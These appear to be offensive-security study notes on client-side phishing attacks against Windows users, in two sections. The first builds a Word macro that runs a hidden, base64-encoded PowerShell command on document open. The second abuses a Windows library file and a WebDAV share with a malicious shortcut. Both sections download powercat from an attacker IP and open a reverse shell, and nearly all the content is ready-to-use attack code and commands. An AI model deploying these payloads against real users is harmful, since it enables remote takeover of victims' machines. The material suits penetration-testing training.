## Exploiting Microsoft Office

1. Create file as .doc or .docm
    
2. View -> Macro -> Create (Macros in mymacro document)
    
3. Create the payload

```shell
echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell"  | iconv -t UTF-16LE | base64 -w 0
```

4. Split the payload

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

5. Add this macro and save.

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
  Dim Str As String
  Str = Str + "powershell.exe -nop -w hidden -enc ..."
  ...
  CreateObject("Wscript.Shell").Run Str
  
End Sub
```

## Abusing Windows Library Files

1. Run webdav

```
pip3 install wsgidav
mkdir /home/kali/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

2. Set config.Library-ms file

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. Put a install.lnk file on the webdav directory

```
Create a .lnk file with
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 9001 -e powershell"
```

4. Of course, deploy a webserver on port 8000 with powercat.ps1 and set up a netcat server on 9001